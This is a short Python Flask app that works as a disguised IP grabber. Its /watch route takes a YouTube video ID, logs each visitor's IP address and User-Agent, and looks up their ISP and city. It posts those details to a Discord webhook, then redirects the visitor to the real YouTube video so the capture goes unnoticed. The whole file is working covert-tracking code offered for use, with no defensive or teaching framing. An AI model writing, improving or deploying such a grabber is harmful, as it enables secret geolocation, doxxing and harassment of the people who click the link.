from flask import Flask, request, redirect
import requests
import datetime

app = Flask(__name__)

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/"

@app.route('/watch', methods=['GET'])
def watch():
    video_id = request.args.get('v')
    if not video_id:
        return "Missing video ID", 400

    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'Unknown')

    ip_info_url = f"https://ipinfo.io/{user_ip}/json"
    try:
        ip_info_response = requests.get(ip_info_url)
        ip_info = ip_info_response.json()
        isp = ip_info.get('org', 'Unknown ISP')
        city = ip_info.get('city', 'Unknown City')
    except Exception as e:
        isp = "Error fetching ISP"
        city = "Error fetching City"

    # 作ってない
    vpn_proxy = "false" 
    
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S %Z")

    payload = {
        "embeds": [
            {
                "title": "New Request Logged",
                "fields": [
                    {"name": "IP Address", "value": user_ip, "inline": False},
                    {"name": "URL", "value": f"https://youtube.com/watch?v={video_id}", "inline": False},
                    {"name": "User-Agent", "value": user_agent, "inline": False},
                    {"name": "ISP", "value": isp, "inline": False},
                    {"name": "City", "value": city, "inline": False},
                    {"name": "VPN/Proxy", "value": vpn_proxy, "inline": False},
                    {"name": "Timestamp", "value": timestamp, "inline": False},
                ],
                "footer": {"text": "IP Details"},
            }
        ]
    }

    try:
        requests.post(DISCORD_WEBHOOK_URL, json=payload)
    except Exception as e:
        print(f"Failed to send webhook: {e}")

    youtube_url = f"https://www.youtube.com/watch?v={video_id}"
    return redirect(youtube_url)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=50000)
